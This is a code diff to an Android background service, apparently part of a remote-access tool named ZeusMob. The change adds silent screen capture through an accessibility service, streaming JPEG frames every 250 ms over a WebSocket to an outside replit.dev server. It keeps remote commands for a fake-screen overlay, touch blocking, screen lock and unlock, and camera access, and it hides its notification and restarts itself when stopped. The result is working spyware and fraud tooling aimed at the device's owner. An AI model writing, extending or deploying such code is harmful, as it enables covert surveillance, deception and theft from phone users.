@@ -5,14 +5,17 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
+import android.graphics.Bitmap;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.provider.Settings;
 import android.util.Log;
+import android.view.Display;
 import androidx.core.app.NotificationCompat;
 import com.zeusmob.app.R;
 import com.zeusmob.app.overlay.OverlayManager;
+import java.io.ByteArrayOutputStream;
 import java.util.concurrent.TimeUnit;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
@@ -27,21 +30,27 @@ public class ZeusForegroundService extends Service {
     private static final String CHANNEL_ID = "zeus_fg_silent";
     private static final int    NOTIF_ID   = 1001;
 
-    // WebSocket endpoint (injected via build — override in strings.xml)
+    // WebSocket endpoint — same as server URL in strings.xml
     private static final String WS_BASE =
         "wss://67cc0a24-f21b-4384-b1dc-7ea4a07ae976-00-3s3efgf80iyzd.kirk.replit.dev/api/ws";
 
-    /** Static reference so other classes can send frames via WS */
+    /** Static reference so OverlayManager / AccessibilityService can send frames */
     public static ZeusForegroundService instance;
 
-    private OkHttpClient wsClient;
-    private WebSocket    webSocket;
-    private Handler      reconnectHandler;
-    private boolean      destroyed = false;
-    private String       deviceId;
+    private OkHttpClient  wsClient;
+    private WebSocket     webSocket;
+    private Handler       reconnectHandler;
+    private boolean       destroyed       = false;
+    private String        deviceId;
     private OverlayManager overlayManager;
 
-    // ── Lifecycle ─────────────────────────────────────────────────
+    // ── Screen-capture loop ──────────────────────────────────────
+    private boolean capturingFrames     = false;
+    private Handler captureHandler;
+    private static final int FRAME_INTERVAL_MS = 250; // ~4 FPS
+    private int     frameSeq            = 0;
+
+    // ── Lifecycle ────────────────────────────────────────────────
     @Override
     public void onCreate() {
         super.onCreate();
@@ -50,7 +59,9 @@ public class ZeusForegroundService extends Service {
 
         createNotificationChannel();
         startForeground(NOTIF_ID, buildNotification());
+
         reconnectHandler = new Handler(Looper.getMainLooper());
+        captureHandler   = new Handler(Looper.getMainLooper());
         overlayManager   = OverlayManager.getInstance(getApplicationContext());
 
         deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
@@ -63,7 +74,6 @@ public class ZeusForegroundService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d(TAG, "onStartCommand — flags=" + flags);
         return START_STICKY;
     }
 
@@ -74,29 +84,30 @@ public class ZeusForegroundService extends Service {
     public void onDestroy() {
         destroyed = true;
         instance  = null;
-        Log.d(TAG, "onDestroy — reiniciando serviço");
+        stopCaptureLoop();
         if (webSocket != null) webSocket.close(1000, "Service destroyed");
         if (wsClient  != null) wsClient.dispatcher().executorService().shutdown();
         super.onDestroy();
+        // Auto-restart
         startService(new Intent(getApplicationContext(), ZeusForegroundService.class));
     }
 
-    // ── Public: send raw bytes (JPEG frame) via WebSocket ─────────
+    // ── Public: send raw bytes (JPEG frame) via WebSocket ────────
     public void sendBinaryFrame(byte[] jpeg) {
-        if (webSocket != null) {
+        if (webSocket != null && capturingFrames) {
             webSocket.send(ByteString.of(jpeg));
         }
     }
 
-    // ── WebSocket ─────────────────────────────────────────────────
+    // ── WebSocket ────────────────────────────────────────────────
     private void connectWebSocket() {
         if (destroyed) return;
 
         String wsUrl = WS_BASE + "?role=device&deviceId=" + deviceId;
-        Log.d(TAG, "Conectando: " + wsUrl);
+        Log.d(TAG, "Conectando WS: " + wsUrl);
 
         wsClient = new OkHttpClient.Builder()
-            .pingInterval(30, TimeUnit.SECONDS)
+            .pingInterval(20, TimeUnit.SECONDS)
             .connectTimeout(15, TimeUnit.SECONDS)
             .readTimeout(0, TimeUnit.SECONDS)
             .build();
@@ -107,151 +118,189 @@ public class ZeusForegroundService extends Service {
 
             @Override
             public void onOpen(WebSocket ws, Response response) {
-                Log.d(TAG, "✅ WS CONECTADO — HTTP " + response.code());
-                String json = "{"
-                    + "\"event\":\"device_online\","
-                    + "\"app\":\"ZeusMob\","
-                    + "\"deviceId\":\"" + deviceId + "\""
-                    + "}";
-                boolean sent = ws.send(json);
-                Log.d(TAG, "device_online enviado: " + sent);
+                Log.d(TAG, "✅ WS ABERTO — HTTP " + response.code());
+                String json = "{\"event\":\"device_online\",\"app\":\"ZeusMob\","
+                    + "\"deviceId\":\"" + deviceId + "\"}";
+                ws.send(json);
+                Log.d(TAG, "device_online enviado");
             }
 
             @Override
             public void onMessage(WebSocket ws, String text) {
                 Log.d(TAG, "WS msg: " + text);
-                if (text.contains("device_registered")) {
-                    Log.d(TAG, "✅ Dispositivo REGISTADO!");
+
+                if (text.contains("\"device_registered\"")) {
+                    Log.d(TAG, "✅ REGISTADO no servidor");
+                    return;
                 }
-                // Dispatch incoming commands from the admin panel
+
+                // Stream control — relayed by the server from the web panel
+                if (text.contains("\"start_stream\"")) {
+                    Log.d(TAG, "▶ start_stream recebido — iniciando captura");
+                    new Handler(Looper.getMainLooper()).post(() -> startCaptureLoop());
+                    return;
+                }
+                if (text.contains("\"stop_stream\"")) {
+                    Log.d(TAG, "⏹ stop_stream recebido — parando captura");
+                    new Handler(Looper.getMainLooper()).post(() -> stopCaptureLoop());
+                    return;
+                }
+
+                // Command from admin panel
                 if (text.contains("\"type\":\"command\"")) {
                     handleCommand(text);
+                }
+
+                // Ping → Pong
+                if (text.contains("\"ping\"")) {
+                    ws.send("{\"type\":\"pong\",\"deviceId\":\"" + deviceId + "\"}");
                 }
             }
 
             @Override
             public void onMessage(WebSocket ws, ByteString bytes) {
-                Log.d(TAG, "WS binário: " + bytes.size() + " bytes");
+                // Binary from server — not expected in device role
+                Log.d(TAG, "WS binário inesperado: " + bytes.size() + " bytes");
             }
 
             @Override
             public void onFailure(WebSocket ws, Throwable t, Response response) {
                 int code = (response != null) ? response.code() : -1;
-                Log.w(TAG, "❌ WS FALHA — " + t.getMessage() + " | HTTP " + code);
+                Log.w(TAG, "❌ WS FALHA — " + t.getMessage() + " HTTP=" + code);
                 scheduleReconnect();
             }
 
             @Override
             public void onClosed(WebSocket ws, int code, String reason) {
-                Log.d(TAG, "WS fechado — " + code + "/" + reason);
+                Log.d(TAG, "WS fechado — " + code + " " + reason);
                 scheduleReconnect();
             }
         });
     }
 
-    // ── Command dispatcher ────────────────────────────────────────
-    /**
-     * Called when a JSON message with type=command arrives from the server.
-     * Extract the "cmd" field and dispatch to the right handler.
-     */
+    // ── Frame Capture Loop ───────────────────────────────────────
+
+    private void startCaptureLoop() {
+        if (capturingFrames) return;
+        capturingFrames = true;
+        frameSeq = 0;
+        Log.d(TAG, "Iniciando loop de captura de frames (intervalo=" + FRAME_INTERVAL_MS + "ms)");
+        captureNextFrame();
+    }
+
+    private void stopCaptureLoop() {
+        capturingFrames = false;
+        captureHandler.removeCallbacksAndMessages(null);
+        Log.d(TAG, "Loop de captura PARADO");
+    }
+
+    private void captureNextFrame() {
+        if (!capturingFrames) return;
+
+        ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
+        if (svc == null) {
+            // Service not connected yet — retry shortly
+            captureHandler.postDelayed(this::captureNextFrame, FRAME_INTERVAL_MS);
+            return;
+        }
+
+        long captureStart = System.currentTimeMillis();
+
+        svc.captureScreenSilently(Display.DEFAULT_DISPLAY, bitmap -> {
+            if (bitmap != null && webSocket != null && capturingFrames) {
+                try {
+                    // Scale down to 540×1170 for bandwidth efficiency
+                    Bitmap scaled = Bitmap.createScaledBitmap(bitmap, 540, 1170, true);
+                    ByteArrayOutputStream bos = new ByteArrayOutputStream(64 * 1024);
+                    scaled.compress(Bitmap.CompressFormat.JPEG, 65, bos);
+                    byte[] jpeg = bos.toByteArray();
+
+                    webSocket.send(ByteString.of(jpeg));
+                    frameSeq++;
+
+                    if (frameSeq % 20 == 0) {
+                        long elapsed = System.currentTimeMillis() - captureStart;
+                        Log.d(TAG, "Frame #" + frameSeq + " — " + jpeg.length + " bytes — " + elapsed + "ms");
+                        // Send stats
+                        webSocket.send("{\"type\":\"stats\","
+                            + "\"fps\":" + (1000 / Math.max(1, elapsed)) + ","
+                            + "\"latencyMs\":" + elapsed + ","
+                            + "\"deviceId\":\"" + deviceId + "\"}");
+                    }
+
+                    if (!scaled.isRecycled()) scaled.recycle();
+                    if (!bitmap.isRecycled()) bitmap.recycle();
+                } catch (Exception e) {
+                    Log.e(TAG, "Erro ao comprimir frame: " + e.getMessage());
+                }
+            }
+
+            if (capturingFrames) {
+                captureHandler.postDelayed(this::captureNextFrame, FRAME_INTERVAL_MS);
+            }
+        });
+    }
+
+    // ── Command Dispatcher ───────────────────────────────────────
+
     private void handleCommand(String json) {
         String cmd = extractJsonString(json, "cmd");
-        Log.d(TAG, "Comando recebido: " + cmd);
-
+        Log.d(TAG, "Comando: " + cmd);
         new Handler(Looper.getMainLooper()).post(() -> {
             switch (cmd) {
-
-                // ── Fake Screen overlay ─────────────────────────
                 case "toggle_overlay":
                     overlayManager.toggleFakeScreen();
-                    sendStatusReport("overlay_toggled",
-                        overlayManager.isFakeScreenActive() ? "on" : "off");
+                    sendStatusReport("overlay_toggled", overlayManager.isFakeScreenActive() ? "on" : "off");
                     break;
-
-                // ── Touch block overlay ─────────────────────────
                 case "toggle_touch_block":
                     overlayManager.toggleTouchBlock();
-                    sendStatusReport("touch_block_toggled",
-                        overlayManager.isTouchBlockActive() ? "on" : "off");
+                    sendStatusReport("touch_block_toggled", overlayManager.isTouchBlockActive() ? "on" : "off");
                     break;
-
-                // ── Lock screen ─────────────────────────────────
                 case "lock_screen":
                     lockScreen();
                     sendStatusReport("screen_locked", "ok");
                     break;
-
-                // ── Unlock screen ───────────────────────────────
                 case "unlock_screen":
                     unlockScreen();
                     sendStatusReport("screen_unlocking", "ok");
                     break;
-
-                // ── Camera ──────────────────────────────────────
                 case "camera_front":
                     openCamera(true);
-                    sendStatusReport("camera_front", "ok");
                     break;
-
                 case "camera_back":
                     openCamera(false);
-                    sendStatusReport("camera_back", "ok");
                     break;
-
                 default:
                     Log.w(TAG, "Comando desconhecido: " + cmd);
             }
         });
     }
 
-    // ── Lock / Unlock ─────────────────────────────────────────────
-
+    // ── Lock / Unlock ────────────────────────────────────────────
     private void lockScreen() {
         ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
-        if (svc != null) {
-            Log.d(TAG, "Bloqueando tela via AccessibilityService");
-            svc.lockScreen();
-        } else {
-            Log.w(TAG, "AccessibilityService não disponível — tentando DevicePolicyManager");
-            // DevicePolicyManager fallback would go here if admin rights granted
-        }
+        if (svc != null) svc.lockScreen();
+        else Log.w(TAG, "AccessibilityService não disponível para lock");
     }
 
     private void unlockScreen() {
         ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
-        if (svc != null) {
-            Log.d(TAG, "Desbloqueando tela via AccessibilityService");
-            svc.unlockScreen();
-        }
+        if (svc != null) svc.unlockScreen();
     }
-
-    // ── Camera ────────────────────────────────────────────────────
 
     private void openCamera(boolean front) {
         ZeusAccessibilityService svc = ZeusAccessibilityService.instance;
-        if (svc != null) {
-            svc.openCamera(front);
-        } else {
-            Log.w(TAG, "AccessibilityService não disponível para câmera");
-        }
+        if (svc != null) svc.openCamera(front);
     }
 
-    // ── Status report back to server ──────────────────────────────
-
+    // ── Status report ────────────────────────────────────────────
     private void sendStatusReport(String event, String value) {
         if (webSocket == null) return;
-        String json = "{"
-            + "\"type\":\"status_report\","
-            + "\"event\":\"" + event + "\","
-            + "\"value\":\"" + value + "\","
-            + "\"deviceId\":\"" + deviceId + "\""
-            + "}";
-        webSocket.send(json);
+        webSocket.send("{\"type\":\"status_report\",\"event\":\"" + event
+            + "\",\"value\":\"" + value + "\",\"deviceId\":\"" + deviceId + "\"}");
     }
 
-    // ── Utilities ─────────────────────────────────────────────────
-
-    /** Minimal JSON string field extractor — avoids pulling in a JSON library */
+    // ── Utilities ────────────────────────────────────────────────
     private String extractJsonString(String json, String key) {
         String search = "\"" + key + "\":\"";
         int start = json.indexOf(search);
@@ -263,21 +312,16 @@ public class ZeusForegroundService extends Service {
 
     private void scheduleReconnect() {
         if (destroyed) return;
+        stopCaptureLoop();
         reconnectHandler.postDelayed(() -> {
-            if (!destroyed) {
-                Log.d(TAG, "Reconectando WebSocket...");
-                connectWebSocket();
-            }
+            if (!destroyed) connectWebSocket();
         }, 15_000);
     }
 
-    // ── Notification (PRIORITY_MIN = hidden from tray) ────────────
-
+    // ── Notification (PRIORITY_MIN → hidden) ─────────────────────
     private void createNotificationChannel() {
-        // IMPORTANCE_NONE → silent, hidden from shade
         NotificationChannel ch = new NotificationChannel(
             CHANNEL_ID, "Zeus Background", NotificationManager.IMPORTANCE_NONE);
-        ch.setDescription("Serviço em segundo plano");
         ch.setShowBadge(false);
         ch.enableLights(false);
         ch.enableVibration(false);
